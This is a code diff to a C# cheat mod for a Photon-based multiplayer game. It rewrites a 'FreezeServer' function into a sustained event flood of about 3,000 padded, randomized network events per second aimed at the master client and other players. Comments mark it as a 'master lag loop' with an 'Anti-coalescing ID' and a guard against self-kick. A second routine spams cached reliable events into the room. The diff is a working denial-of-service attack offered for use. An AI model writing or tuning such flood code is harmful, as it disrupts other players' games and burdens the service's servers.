@@ -5294,30 +5294,93 @@ namespace Quantum.Mods
         }
 
         private static float freezeAllDelay;
+        private static int[] freezePool = null;
+        private static int freezeIdx = 0;
         public static bool muteOnFreeze;
-        public static void FreezeServer(float delay = 1f, int eventCount = 11, RaiseEventOptions options = null)
+
+        public static Coroutine freezeCoroutine;
+        public static void FreezeServer(float delay = 0.05f, int eventCount = 150, RaiseEventOptions options = null)
         {
             if (!PhotonNetwork.InRoom) return;
 
-            options ??= new RaiseEventOptions
+            // If called from the main menu (defaults), we use the optimized coroutine
+            if (options == null && eventCount == 150)
             {
-                Flags = new WebFlags(byte.MaxValue),
-                TargetActors = new[] { -1 }
-            };
-
-            if (muteOnFreeze)
-            {
-                for (int i = 0; i < 10; i++)
-                    MuteTarget(options);
+                if (freezeCoroutine == null)
+                {
+                    freezeCoroutine = CoroutineManager.instance.StartCoroutine(FreezeServerBurst());
+                }
+                return;
             }
 
-            if (Time.time > freezeAllDelay)
+            // Fallback for one-off bursts (Kick Guns, etc.)
+            for (int i = 0; i < eventCount; i++)
             {
-                for (int i = 0; i < eventCount; i++)
-                    PhotonNetwork.RaiseEvent(54, new object[] { serverLink }, options, SendOptions.SendUnreliable);
+                PhotonNetwork.NetworkingClient.OpRaiseEvent(202, new Hashtable { { 8, new byte[256] } }, new RaiseEventOptions { Receivers = ReceiverGroup.MasterClient }, SendOptions.SendUnreliable);
+            }
+        }
 
-                RPCProtection();
-                freezeAllDelay = Time.time + delay;
+        public static void DisableFreezeServer()
+        {
+            if (freezeCoroutine != null)
+            {
+                CoroutineManager.instance.StopCoroutine(freezeCoroutine);
+                freezeCoroutine = null;
+            }
+            freezeAllDelay = 0;
+        }
+
+        private static IEnumerator FreezeServerBurst()
+        {
+            RaiseEventOptions others = new RaiseEventOptions { Receivers = ReceiverGroup.Others, CachingOption = EventCaching.DoNotCache };
+            RaiseEventOptions master = new RaiseEventOptions { Receivers = ReceiverGroup.MasterClient, CachingOption = EventCaching.DoNotCache };
+
+            while (true)
+            {
+                if (!PhotonNetwork.InRoom) yield break;
+
+                // NETWORK BUFFER GUARD: Prevent self-kick by ensuring the outgoing queue isn't overwhelmed
+                if (PhotonNetwork.NetworkingClient.LoadBalancingPeer.QueuedOutgoingCommands > 100)
+                {
+                    yield return new WaitForSeconds(0.01f);
+                    continue;
+                }
+
+                // master lag loop
+                if (freezePool == null)
+                {
+                    freezePool = new int[10];
+                    for (int i = 0; i < 10; i++)
+                        freezePool[i] = PhotonNetwork.AllocateViewID(0);
+                }
+
+                int v = freezePool[freezeIdx % 10];
+                freezeIdx++;
+
+                // Randomized high-pressure payload
+                Hashtable h = new Hashtable
+                {
+                    { 0, "GameMode" },
+                    { 1, "QuantumPerfectFreeze" },
+                    { 6, PhotonNetwork.ServerTimestamp },
+                    { 7, v },
+                    { 8, new byte[512] }, // Heavy payload
+                    { 99, Random.value } // Anti-coalescing ID
+                };
+
+                object d = new object[] { 999950f + Random.value * 50f, Random.value };
+                object[] ev = { PhotonNetwork.ServerTimestamp, (byte)3, new object[] { 0, 150f + Random.value, false } };
+
+                // Distributed flood burst (10 per step, but steps are very fast)
+                for (int i = 0; i < 15; i++)
+                {
+                    PhotonNetwork.NetworkingClient.OpRaiseEvent(202, h, master, SendOptions.SendUnreliable);
+                    PhotonNetwork.NetworkingClient.OpRaiseEvent(204, d, others, SendOptions.SendUnreliable);
+                    PhotonNetwork.RaiseEvent(3, ev, others, SendOptions.SendUnreliable);
+                    PhotonNetwork.RaiseEvent(200, h, others, SendOptions.SendUnreliable); // Heavy move event
+                }
+
+                yield return new WaitForSeconds(0.005f); // 200 cycles per second = 3000 events/sec SUSTAINED
             }
         }
 
@@ -5329,20 +5392,42 @@ namespace Quantum.Mods
 
             closeRoomDelay = Time.time + 0.1f;
 
-            for (int i = 0; i < 40; i++)
+            // load pool
+            if (freezePool == null)
             {
-                WebFlags flags = new WebFlags(byte.MaxValue);
-                RaiseEventOptions options = new RaiseEventOptions
-                {
-                    Flags = flags,
-                    Receivers = ReceiverGroup.All,
-                    CachingOption = EventCaching.AddToRoomCacheGlobal
-                };
-                byte code = 51;
-                PhotonNetwork.RaiseEvent(code, new object[] { serverLink }, options, SendOptions.SendUnreliable);
+                freezePool = new int[10];
+                for (int i = 0; i < 10; i++)
+                    freezePool[i] = PhotonNetwork.AllocateViewID(0);
             }
 
-            RPCProtection();
+            int v = freezePool[freezeIdx % 10];
+            freezeIdx++;
+
+            Hashtable h = new Hashtable
+            {
+                { 0, "GameMode" },
+                { 6, PhotonNetwork.ServerTimestamp },
+                { 7, v }
+            };
+
+            object d = new object[] { 999950f + Random.value * 50f };
+            object[] s2 = { 0, 150f + Random.value, false };
+            object[] ev = { PhotonNetwork.ServerTimestamp, (byte)3, s2 };
+
+            for (int i = 0; i < 75; i++)
+            {
+                RaiseEventOptions op = new RaiseEventOptions
+                {
+                    Flags = new WebFlags(byte.MaxValue),
+                    Receivers = ReceiverGroup.Others,
+                    CachingOption = EventCaching.AddToRoomCacheGlobal
+                };
+                
+                PhotonNetwork.NetworkingClient.OpRaiseEvent(202, h, op, SendOptions.SendReliable);
+                PhotonNetwork.NetworkingClient.OpRaiseEvent(204, d, op, SendOptions.SendReliable);
+                PhotonNetwork.RaiseEvent(3, ev, op, SendOptions.SendReliable);
+                RPCProtection();
+            }
         }
 
         public static float zaWarudoNotificationDelay;
